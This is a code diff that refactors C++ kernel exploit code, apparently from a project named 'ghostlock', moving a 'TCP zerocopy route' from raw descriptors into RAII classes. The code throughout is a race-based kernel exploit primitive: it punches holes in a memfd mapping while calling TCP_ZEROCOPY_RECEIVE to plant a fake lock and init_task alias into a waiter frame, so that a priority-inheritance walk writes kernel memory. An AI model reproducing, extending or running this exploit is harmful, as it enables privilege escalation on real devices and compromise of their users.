@@ -318,15 +318,14 @@ static void tcp_wait_for_consumer_idle(TcpZerocopyRouteContext *context) {
 }
 
 /* Decoupling plan: create a connected loopback TCP pair. Input: output slots;
- * output: 0/-1 and owned descriptors. Future: tcp_zerocopy_open_pair(context),
- * recording descriptor ownership in TcpZerocopyRouteContext. */
+ * output: 0/-1 and owned descriptors recorded in TcpZerocopyRouteContext. */
 static int tcp_make_pair(TcpZerocopyRouteContext *context) {
-    int listener = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
-    if (listener < 0) {
+    ghostlock::UniqueFd listener(socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0));
+    if (!listener.valid()) {
         return -1;
     }
     int one = 1;
-    setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
+    setsockopt(listener.get(), SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
 
     struct sockaddr_in addr;
     memset(&addr, 0, sizeof(addr));
@@ -334,45 +333,28 @@ static int tcp_make_pair(TcpZerocopyRouteContext *context) {
     addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
     addr.sin_port = 0;
 
-    if (bind(listener, (struct sockaddr *) &addr, sizeof(addr)) != 0 ||
-            listen(listener, 1) != 0) {
-        int saved = errno;
-        close(listener);
-        errno = saved;
+    if (bind(listener.get(), (struct sockaddr *) &addr, sizeof(addr)) != 0 ||
+            listen(listener.get(), 1) != 0) {
         return -1;
     }
 
     socklen_t addr_len = sizeof(addr);
-    if (getsockname(listener, (struct sockaddr *) &addr, &addr_len) != 0) {
-        int saved = errno;
-        close(listener);
-        errno = saved;
+    if (getsockname(listener.get(), (struct sockaddr *) &addr, &addr_len) != 0) {
         return -1;
     }
 
-    context->client_fd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
-    if (context->client_fd < 0) {
-        int saved = errno;
-        close(listener);
-        errno = saved;
+    context->client_fd.reset(socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0));
+    if (!context->client_fd.valid()) {
         return -1;
     }
-    if (connect(context->client_fd, (struct sockaddr *) &addr, sizeof(addr)) != 0) {
-        int saved = errno;
-        close(context->client_fd);
-        context->client_fd = -1;
-        close(listener);
-        errno = saved;
+    if (connect(context->client_fd.get(), (struct sockaddr *) &addr, sizeof(addr)) != 0) {
+        context->client_fd.reset();
         return -1;
     }
 
-    context->server_fd = accept4(listener, NULL, NULL, SOCK_CLOEXEC);
-    int saved = errno;
-    close(listener);
-    if (context->server_fd < 0) {
-        close(context->client_fd);
-        context->client_fd = -1;
-        errno = saved;
+    context->server_fd.reset(accept4(listener.get(), NULL, NULL, SOCK_CLOEXEC));
+    if (!context->server_fd.valid()) {
+        context->client_fd.reset();
         return -1;
     }
     return 0;
@@ -388,13 +370,13 @@ static void *tcp_punch_thread(void *arg) {
         sched_yield();
     }
     while (!atomic_load(&context->punch_stop)) {
-        if (fallocate(context->punch_fd, 0, 0, context->mapping_length) != 0) {
+        if (fallocate(context->punch_fd.get(), 0, 0, context->mapping_length) != 0) {
             atomic_store(&context->punch_failed, errno ? errno : EIO);
             pr_warning("tcp punch fill errno=%d\n", errno);
             break;
         }
         atomic_store(&context->punch_phase, 1);
-        if (fallocate(context->punch_fd,
+        if (fallocate(context->punch_fd.get(),
                 FALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE,
                 (off_t) context->page_size,
                 context->mapping_length - context->page_size) != 0) {
@@ -411,130 +393,121 @@ static void *tcp_punch_thread(void *arg) {
     return NULL;
 }
 
-static int tcp_zerocopy_fail(TcpZerocopyRouteContext *context,
-        int step, int error_number) {
-    context->status.step = step;
-    context->status.error_number = error_number;
-    return -1;
-}
-
 /* Acquire every userspace resource owned by the TCP route. No PI consumer or
  * punch operation is armed until this function has completed successfully. */
-static int tcp_zerocopy_prepare(TcpZerocopyRouteContext *context) {
+int ghostlock::TcpZerocopyRoute::prepare() noexcept {
     if (!page_base || !fake_lock || !fake_fops) {
         pr_warning("tcp route missing page=%016zx lock=%016zx fops=%016zx\n",
                 page_base, fake_lock, fake_fops);
-        return tcp_zerocopy_fail(context, 40, 0);
+        return fail(40, 0);
     }
 
-    if (tcp_make_pair(context) != 0) {
+    if (tcp_make_pair(this) != 0) {
         pr_warning("tcp route pair setup failed errno=%d\n", errno);
-        return tcp_zerocopy_fail(context, 41, errno);
+        return fail(41, errno);
     }
 
-    context->page_size = (size_t) sysconf(_SC_PAGESIZE);
-    context->punch_fd =
-            (int) syscall(SYS_memfd_create, "ghostlock-tcp", MFD_CLOEXEC);
-    if (context->punch_fd < 0 ||
-            fallocate(context->punch_fd, 0, 0, context->mapping_length) != 0) {
+    page_size = (size_t) sysconf(_SC_PAGESIZE);
+    punch_fd.reset(
+            (int) syscall(SYS_memfd_create, "ghostlock-tcp", MFD_CLOEXEC));
+    if (!punch_fd.valid() ||
+            fallocate(punch_fd.get(), 0, 0, mapping_length) != 0) {
         pr_warning("tcp route memfd/fallocate errno=%d\n", errno);
-        return tcp_zerocopy_fail(context, 42, errno);
+        return fail(42, errno);
     }
-    context->mapping = static_cast<unsigned char *>(
-            mmap(NULL, context->mapping_length, PROT_READ | PROT_WRITE,
-                    MAP_SHARED, context->punch_fd, 0));
-    if (context->mapping == MAP_FAILED) {
+    void *mapped = mmap(NULL, mapping_length, PROT_READ | PROT_WRITE,
+            MAP_SHARED, punch_fd.get(), 0);
+    if (mapped == MAP_FAILED) {
         pr_warning("tcp route mmap errno=%d\n", errno);
-        return tcp_zerocopy_fail(context, 43, errno);
+        return fail(43, errno);
     }
-    for (size_t off = 0; off < context->mapping_length;
-         off += context->page_size) {
-        context->mapping[off] = 0x55;
+    mapping = MappedRegion(mapped, mapping_length);
+    unsigned char *bytes = static_cast<unsigned char *>(mapping.data());
+    for (size_t off = 0; off < mapping_length; off += page_size) {
+        bytes[off] = 0x55;
     }
 
-    atomic_store(&context->race->consumer_stop, 0);
-    atomic_store(&context->race->consumer_go, 0);
-    atomic_store(&context->race->consumer_calls, 0);
-    atomic_store(&context->race->consumer_success, 0);
-    int thread_error = pthread_create(
-            &context->punch_worker, NULL, tcp_punch_thread, context);
+    atomic_store(&race->consumer_stop, 0);
+    atomic_store(&race->consumer_go, 0);
+    atomic_store(&race->consumer_calls, 0);
+    atomic_store(&race->consumer_success, 0);
+    int thread_error = punch_worker.start(tcp_punch_thread, this);
     if (thread_error != 0) {
         pr_warning("tcp route punch thread errno=%d\n", thread_error);
-        return tcp_zerocopy_fail(context, 44, thread_error);
+        return fail(44, thread_error);
     }
-    context->punch_worker_started = 1;
     return 0;
 }
 
 /* Run the route after prepare has established exclusive resource ownership. */
-static RouteStatus tcp_zerocopy_execute(TcpZerocopyRouteContext *context) {
+RouteStatus ghostlock::TcpZerocopyRoute::execute() noexcept {
     /* waiter->task carries init_task's phys alias, not the image address */
     uintptr_t waiter_task = SLIDE_INIT_TASK;
-    int arm_seq = (int) context->execution->tcp_arm_sequence;
+    int arm_seq = (int) execution->tcp_arm_sequence;
     int post_hold =
-            (int) context->execution->tcp_post_receive_hold_iterations;
-    int attempts = (int) context->execution->tcp_attempts;
+            (int) execution->tcp_post_receive_hold_iterations;
+    int attempts = (int) execution->tcp_attempts;
 
     pr_info("tcp route enter page=%016zx fake_lock=%016zx fake_w0=%016zx "
             "fake_task=%016zx task=%016zx attempts=%d arm=%d hold=%d\n",
             page_base, fake_lock, fake_w0, fake_task, waiter_task,
             attempts, arm_seq, post_hold);
 
-    atomic_store(&context->punch_go, 1);
+    atomic_store(&punch_go, 1);
     /* custom-write mode: fire the PI walk immediately */
-    atomic_store(&context->race->route_delay_usec, 0);
+    atomic_store(&race->route_delay_usec, 0);
 
     char sendbuf[64];
     memset(sendbuf, 0x33, sizeof(sendbuf));
 
-    for (int i = 1; i <= attempts && !context->route_won; i++) {
-        int calls_before = atomic_load(&context->race->consumer_calls);
-        int success_before = atomic_load(&context->race->consumer_success);
-        (void) send(context->server_fd, sendbuf, sizeof(sendbuf), MSG_DONTWAIT);
-        while (atomic_load(&context->punch_phase)) {
+    for (int i = 1; i <= attempts && !route_won; i++) {
+        int calls_before = atomic_load(&race->consumer_calls);
+        int success_before = atomic_load(&race->consumer_success);
+        (void) send(server_fd.get(), sendbuf, sizeof(sendbuf), MSG_DONTWAIT);
+        while (atomic_load(&punch_phase)) {
             sched_yield();
         }
         for (int spin = 0;
-             !atomic_load(&context->punch_phase) &&
-                     !atomic_load(&context->punch_failed) &&
+             !atomic_load(&punch_phase) &&
+                     !atomic_load(&punch_failed) &&
                      spin < 10000000;
              spin++) {
             __asm__ volatile("yield":: : "memory");
         }
-        if (atomic_load(&context->punch_failed)) {
-            tcp_zerocopy_fail(context, 46,
-                    atomic_load(&context->punch_failed));
+        if (atomic_load(&punch_failed)) {
+            (void) fail(46, atomic_load(&punch_failed));
             pr_warning("tcp route puncher failed errno=%d\n",
-                    context->status.error_number);
+                    status.error_number);
             break;
         }
 
         unsigned char zc[0x40];
         memset(zc, 0, sizeof(zc));
         put64(zc, 0x18,
-                (uint64_t)(uintptr_t)(context->mapping + context->page_size));
+                (uint64_t)(uintptr_t)(static_cast<unsigned char *>(
+                        mapping.data()) + page_size));
         put32(zc, 0x20, sizeof(sendbuf));
         put64(zc, 0x28, waiter_task);
         put64(zc, 0x30, fake_lock);
 
         socklen_t len = sizeof(zc);
         errno = 0;
-        int ret = getsockopt(context->client_fd, IPPROTO_TCP,
+        int ret = getsockopt(client_fd.get(), IPPROTO_TCP,
                 TCP_ZEROCOPY_RECEIVE, zc,
                 &len);
         int saved_errno = errno;
         /* release the consumer only once the zerocopy write landed in the
          * waiter frame; earlier release walks a half-written waiter */
         if (i >= arm_seq && ret == 0) {
-            atomic_store(&context->race->consumer_go, i);
+            atomic_store(&race->consumer_go, i);
             for (int spin = 0; spin < post_hold; spin++) {
                 __asm__ volatile("yield":: : "memory");
             }
-            tcp_wait_for_consumer_idle(context);
+            tcp_wait_for_consumer_idle(this);
         }
 
-        int calls = atomic_load(&context->race->consumer_calls);
-        int success = atomic_load(&context->race->consumer_success);
+        int calls = atomic_load(&race->consumer_calls);
+        int success = atomic_load(&race->consumer_success);
         if (calls <= calls_before || success <= success_before) {
             if ((i % 100) == 0 || ret != 0) {
                 pr_info("tcp route seq=%d ret=%d errno=%d len=%u calls=%d "
@@ -545,79 +518,36 @@ static RouteStatus tcp_zerocopy_execute(TcpZerocopyRouteContext *context) {
         }
         /* consumer fired: the PI walk derefed the crafted waiter and wrote.
          * stages verify their own effects; no cfi stage here. */
-        context->route_won = 1;
-        context->status.code = ROUTE_OK;
-        context->status.step = 0;
-        context->status.error_number = 0;
+        route_won = 1;
+        status.code = ROUTE_OK;
+        status.step = 0;
+        status.error_number = 0;
     }
-    if (!context->route_won && context->status.step == 0) {
-        tcp_zerocopy_fail(context, 45, 0);
+    if (!route_won && status.step == 0) {
+        (void) fail(45, 0);
     }
-    return context->status;
-}
-
-/* Stop every trigger before releasing any descriptor or mapping. */
-static void tcp_zerocopy_disarm(TcpZerocopyRouteContext *context) {
-    atomic_store(&context->race->consumer_go, 0);
-    atomic_store(&context->punch_go, 0);
-    atomic_store(&context->punch_stop, 1);
-    tcp_wait_for_consumer_idle(context);
-    context->status.kernel_disarmed = 1;
-}
-
-/* Join the owned worker, then release each owned userspace resource once. */
-static void tcp_zerocopy_destroy(TcpZerocopyRouteContext *context) {
-    if (context->punch_worker_started) {
-        int join_error = pthread_join(context->punch_worker, NULL);
-        if (join_error != 0) {
-            tcp_zerocopy_fail(context, 47, join_error);
-            context->status.code = ROUTE_DIRTY_FAILURE;
-            pr_warning("tcp route punch join errno=%d; resources retained\n",
-                    join_error);
-            return;
-        }
-        context->punch_worker_started = 0;
-    }
-    if (context->mapping != MAP_FAILED) {
-        if (munmap(context->mapping, context->mapping_length) != 0) {
-            int saved_errno = errno;
-            tcp_zerocopy_fail(context, 48, saved_errno);
-            context->status.code = ROUTE_DIRTY_FAILURE;
-            pr_warning("tcp route munmap errno=%d\n", saved_errno);
-            return;
-        }
-        context->mapping = static_cast<unsigned char *>(MAP_FAILED);
-    }
-    if (context->punch_fd >= 0) {
-        close(context->punch_fd);
-        context->punch_fd = -1;
-    }
-    if (context->server_fd >= 0) {
-        close(context->server_fd);
-        context->server_fd = -1;
-    }
-    if (context->client_fd >= 0) {
-        close(context->client_fd);
-        context->client_fd = -1;
-    }
-    context->status.userspace_clean = 1;
-    if (!context->route_won && context->status.kernel_disarmed) {
-        context->status.code = ROUTE_FALLBACK_SAFE;
-    }
+    return status;
 }
 
 /* Public compatibility entry: lifecycle is now explicitly ordered while the
  * common route dispatcher remains scheduled for S14. */
 RouteStatus do_tcp_fake_lock_route(const WriteRequest *request) {
-    TcpZerocopyRouteContext context;
-    tcp_zerocopy_route_context_init(
-            &context, &g_pi_race_context, request, execution_settings(),
+    TcpZerocopyRouteContext context(
+            &g_pi_race_context, request, execution_settings(),
             TCP_PUNCH_SHMEM_LEN);
-    if (tcp_zerocopy_prepare(&context) == 0) {
-        tcp_zerocopy_execute(&context);
+    if (context.prepare() == 0) {
+        (void) context.execute();
     }
-    tcp_zerocopy_disarm(&context);
-    tcp_zerocopy_destroy(&context);
+    context.disarm();
+    context.destroy();
+    if (context.status.code == ROUTE_DIRTY_FAILURE &&
+            context.status.step == 47) {
+        pr_warning("tcp route punch join errno=%d; resources retained\n",
+                context.status.error_number);
+    } else if (context.status.code == ROUTE_DIRTY_FAILURE &&
+            context.status.step == 48) {
+        pr_warning("tcp route munmap errno=%d\n", context.status.error_number);
+    }
 
     pr_info("tcp route done=%d calls=%d success=%d status=%d clean=%d/%d "
             "step=%d errno=%d\n",
